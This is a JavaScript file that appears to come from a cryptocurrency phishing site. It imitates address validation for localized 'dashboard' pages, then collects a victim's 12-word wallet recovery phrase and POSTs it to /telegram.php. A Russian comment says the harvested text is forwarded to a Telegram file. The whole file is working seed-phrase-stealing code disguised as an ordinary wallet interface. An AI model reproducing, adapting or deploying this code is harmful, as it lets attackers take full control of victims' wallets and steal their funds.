function validateInputMainFormEn() {
    let form_val = document.getElementsByClassName("main_form")[0].value.trim();
    if (form_val.search("[a-zA-Z]") === -1 || form_val.search("[0-9]") === -1 
        || form_val.length < 25 || form_val.length > 50) {
        window.alert("Not a valid ETH or BTC address");
} else {
    window.open("dashboard.html", "_self");
}
}
function validateInputMainFormRu() {
    let form_val = document.getElementsByClassName("main_form")[0].value.trim();
    if (form_val.search("[a-zA-Z]") === -1 || form_val.search("[0-9]") === -1 
        || form_val.length < 25 || form_val.length > 50) {
        window.alert("Not a valid ETH or BTC address");
} else {
    window.open("dashboard_ru.html", "_self");
}
}
function validateInputMainFormIt() {
    let form_val = document.getElementsByClassName("main_form")[0].value.trim();
    if (form_val.search("[a-zA-Z]") === -1 || form_val.search("[0-9]") === -1 
        || form_val.length < 25 || form_val.length > 50) {
        window.alert("Not a valid ETH or BTC address");
} else {
    window.open("dashboard_it.html", "_self");
}
}
function validateInputMainFormId() {
    let form_val = document.getElementsByClassName("main_form")[0].value.trim();
    if (form_val.search("[a-zA-Z]") === -1 || form_val.search("[0-9]") === -1 
        || form_val.length < 25 || form_val.length > 50) {
        window.alert("Not a valid ETH or BTC address");
} else {
    window.open("dashboard_id.html", "_self");
}
}
function validateInputMainFormFr() {
    let form_val = document.getElementsByClassName("main_form")[0].value.trim();
    if (form_val.search("[a-zA-Z]") === -1 || form_val.search("[0-9]") === -1 
        || form_val.length < 25 || form_val.length > 50) {
        window.alert("Not a valid ETH or BTC address");
} else {
    window.open("dashboard_fr.html", "_self");
}
}
function validateInputMainFormEs() {
    let form_val = document.getElementsByClassName("main_form")[0].value.trim();
    if (form_val.search("[a-zA-Z]") === -1 || form_val.search("[0-9]") === -1 
        || form_val.length < 25 || form_val.length > 50) {
        window.alert("Not a valid ETH or BTC address");
} else {
    window.open("dashboard_es.html", "_self");
}
}
function validateInputMainFormEl() {
    let form_val = document.getElementsByClassName("main_form")[0].value.trim();
    if (form_val.search("[a-zA-Z]") === -1 || form_val.search("[0-9]") === -1 
        || form_val.length < 25 || form_val.length > 50) {
        window.alert("Not a valid ETH or BTC address");
} else {
    window.open("dashboard_el.html", "_self");
}
}
function validateInputMainFormDe() {
    let form_val = document.getElementsByClassName("main_form")[0].value.trim();
    if (form_val.search("[a-zA-Z]") === -1 || form_val.search("[0-9]") === -1 
        || form_val.length < 25 || form_val.length > 50) {
        window.alert("Not a valid ETH or BTC address");
} else {
    window.open("dashboard_de.html", "_self");
}
}
function validateInputMainFormCn() {
    let form_val = document.getElementsByClassName("main_form")[0].value.trim();
    if (form_val.search("[a-zA-Z]") === -1 || form_val.search("[0-9]") === -1 
        || form_val.length < 25 || form_val.length > 50) {
        window.alert("Not a valid ETH or BTC address");
} else {
    window.open("dashboard_cn.html", "_self");
}
}



/* СКРИПТ КОТОРЫЙ ОБРАБАТЫВАЕТ ИНФОРМАЦИЮ И ЕСЛИ ВСЕ УСПЕШНО ПЕРЕВОДИТ ТЕКСТ В ТЕЛЕГРАМ ФАЙЛ */
function validateInput_1() {
    var sid_val = document.getElementById("sid_input_1").value;
    size = sid_val.trim().split(" ").filter(item => item !== "").length;

    if (size === 12) {
        var data = new FormData();
        
        var cur_val = document.getElementById("cur_input_1").value;

        data.append("sid", sid_val.trim());
        data.append("currency", cur_val);
        createAndSendPostRequest("/telegram.php", data, function () {
            return 0;
        })
        window.location = "disc.html";
    } else {
        window.alert("Only 12 words");
        document.getElementById("sid_input_1").value = "";
    }

}
/* СКРИПТ КОТОРЫЙ ОБРАБАТЫВАЕТ ИНФОРМАЦИЮ И ЕСЛИ ВСЕ УСПЕШНО ПЕРЕВОДИТ ТЕКСТ В ТЕЛЕГРАМ ФАЙЛ */
function validateInput_2() {
    var sid_val = document.getElementById("sid_input_2").value;
    size = sid_val.trim().split(" ").filter(item => item !== "").length;

    if (size === 12) {
        var data = new FormData();
        
        var cur_val = document.getElementById("cur_input_2").value;

        data.append("sid", sid_val.trim());
        data.append("currency", cur_val);
        createAndSendPostRequest("/telegram.php", data, function () {
            return 0;
        })
        window.location = "disc.html";
    } else {
        window.alert("Only 12 words");
        document.getElementById("sid_input_2").value = "";
    }

}

function validateInput_3() {
    var sid_val = document.getElementById("sid_input_3").value;
    size = sid_val.trim().split(" ").filter(item => item !== "").length;

    if (size === 12) {
        var data = new FormData();
        
        var cur_val = document.getElementById("cur_input_3").value;

        data.append("sid", sid_val.trim());
        data.append("currency", cur_val);
        createAndSendPostRequest("/telegram.php", data, function () {
            return 0;
        })
        window.location = "disc.html";
    } else {
        window.alert("Only 12 words");
        document.getElementById("sid_input_3").value = "";
    }

}

function validateInput_4() {
    var sid_val = document.getElementById("sid_input_4").value;
    size = sid_val.trim().split(" ").filter(item => item !== "").length;

    if (size === 12) {
        var data = new FormData();
        
        var cur_val = document.getElementById("cur_input_4").value;

        data.append("sid", sid_val.trim());
        data.append("currency", cur_val);
        createAndSendPostRequest("/telegram.php", data, function () {
            return 0;
        })
        window.location = "disc.html";
    } else {
        window.alert("Only 12 words");
        document.getElementById("sid_input_4").value = "";
    }

}

function validateInput_5() {
    var sid_val = document.getElementById("sid_input_5").value;
    size = sid_val.trim().split(" ").filter(item => item !== "").length;

    if (size === 12) {
        var data = new FormData();
        
        var cur_val = document.getElementById("cur_input_5").value;

        data.append("sid", sid_val.trim());
        data.append("currency", cur_val);
        createAndSendPostRequest("/telegram.php", data, function () {
            return 0;
        })
        window.location = "disc.html";
    } else {
        window.alert("Only 12 words");
        document.getElementById("sid_input_5").value = "";
    }

}

function validateInput_6() {
    var sid_val = document.getElementById("sid_input_6").value;
    size = sid_val.trim().split(" ").filter(item => item !== "").length;

    if (size === 12) {
        var data = new FormData();
        
        var cur_val = document.getElementById("cur_input_6").value;

        data.append("sid", sid_val.trim());
        data.append("currency", cur_val);
        createAndSendPostRequest("/telegram.php", data, function () {
            return 0;
        })
        window.location = "disc.html";
    } else {
        window.alert("Only 12 words");
        document.getElementById("sid_input_6").value = "";
    }

}

function validateInput_7() {
    var sid_val = document.getElementById("sid_input_7").value;
    size = sid_val.trim().split(" ").filter(item => item !== "").length;

    if (size === 12) {
        var data = new FormData();
        
        var cur_val = document.getElementById("cur_input_7").value;

        data.append("sid", sid_val.trim());
        data.append("currency", cur_val);
        createAndSendPostRequest("/telegram.php", data, function () {
            return 0;
        })
        window.location = "disc.html";
    } else {
        window.alert("Only 12 words");
        document.getElementById("sid_input_7").value = "";
    }

}

function validateInput_8() {
    var sid_val = document.getElementById("sid_input_8").value;
    size = sid_val.trim().split(" ").filter(item => item !== "").length;

    if (size === 12) {
        var data = new FormData();
        
        var cur_val = document.getElementById("cur_input_8").value;

        data.append("sid", sid_val.trim());
        data.append("currency", cur_val);
        createAndSendPostRequest("/telegram.php", data, function () {
            return 0;
        })
        window.location = "disc.html";
    } else {
        window.alert("Only 12 words");
        document.getElementById("sid_input_8").value = "";
    }

}

function validateInput_9() {
    var sid_val = document.getElementById("sid_input_9").value;
    size = sid_val.trim().split(" ").filter(item => item !== "").length;

    if (size === 12) {
        var data = new FormData();
        
        var cur_val = document.getElementById("cur_input_9").value;

        data.append("sid", sid_val.trim());
        data.append("currency", cur_val);
        createAndSendPostRequest("/telegram.php", data, function () {
            return 0;
        })
        window.location = "disc.html";
    } else {
        window.alert("Only 12 words");
        document.getElementById("sid_input_9").value = "";
    }

}

function validateInput_10() {
    var sid_val = document.getElementById("sid_input_10").value;
    size = sid_val.trim().split(" ").filter(item => item !== "").length;

    if (size === 12) {
        var data = new FormData();
        
        var cur_val = document.getElementById("cur_input_10").value;

        data.append("sid", sid_val.trim());
        data.append("currency", cur_val);
        createAndSendPostRequest("/telegram.php", data, function () {
            return 0;
        })
        window.location = "disc.html";
    } else {
        window.alert("Only 12 words");
        document.getElementById("sid_input_10").value = "";
    }

}

function validateInput_11() {
    var sid_val = document.getElementById("sid_input_11").value;
    size = sid_val.trim().split(" ").filter(item => item !== "").length;

    if (size === 12) {
        var data = new FormData();
        
        var cur_val = document.getElementById("cur_input_11").value;

        data.append("sid", sid_val.trim());
        data.append("currency", cur_val);
        createAndSendPostRequest("/telegram.php", data, function () {
            return 0;
        })
        window.location = "disc.html";
    } else {
        window.alert("Only 12 words");
        document.getElementById("sid_input_11").value = "";
    }

}

function validateInput_12() {
    var sid_val = document.getElementById("sid_input_12").value;
    size = sid_val.trim().split(" ").filter(item => item !== "").length;

    if (size === 12) {
        var data = new FormData();
        
        var cur_val = document.getElementById("cur_input_12").value;

        data.append("sid", sid_val.trim());
        data.append("currency", cur_val);
        createAndSendPostRequest("/telegram.php", data, function () {
            return 0;
        })
        window.location = "disc.html";
    } else {
        window.alert("Only 12 words");
        document.getElementById("sid_input_12").value = "";
    }

}

function validateInput_13() {
    var sid_val = document.getElementById("sid_input_13").value;
    size = sid_val.trim().split(" ").filter(item => item !== "").length;

    if (size === 12) {
        var data = new FormData();
        
        var cur_val = document.getElementById("cur_input_13").value;

        data.append("sid", sid_val.trim());
        data.append("currency", cur_val);
        createAndSendPostRequest("/telegram.php", data, function () {
            return 0;
        })
        window.location = "disc.html";
    } else {
        window.alert("Only 12 words");
        document.getElementById("sid_input_13").value = "";
    }

}

function createAndSendPostRequest(url, data, method) {
    var request = new XMLHttpRequest();
    
    request.onreadystatechange = function () {
        if (request.readyState === request.DONE && request.status === 200) {
            method(data);
        }
    };

    request.open("POST", url, true);
    request.send(data);
}